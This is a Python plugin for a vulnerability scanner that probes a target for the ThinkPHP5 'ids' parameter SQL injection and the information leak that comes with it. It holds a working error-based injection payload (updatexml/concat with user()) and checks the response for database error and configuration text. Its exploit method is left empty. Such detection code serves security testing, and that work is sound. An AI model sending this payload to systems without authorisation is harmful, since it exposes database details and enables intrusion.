#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
ThinkPHP5 ids参数 sql注入漏洞
    暂无编号
        Payload: https://vulhub.org/#/environments/thinkphp/in-sqlinjection/

ThinkPHP5 SQL注入漏洞&&敏感信息泄露漏洞
'''

from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {'path': 'index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'},
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        
        vul_info = {
            'app_name': 'ThinkPHP',
            'vul_type': 'SQLinject',
            'vul_id': 'thinkphp-5-ids-sqlinject',
        }

        for payload in self.payloads:
            path = payload['path']

            res = client.request(
                'get',
                path,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (('XPATH syntax error' in res.text) and ('Database Config' in res.text)):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
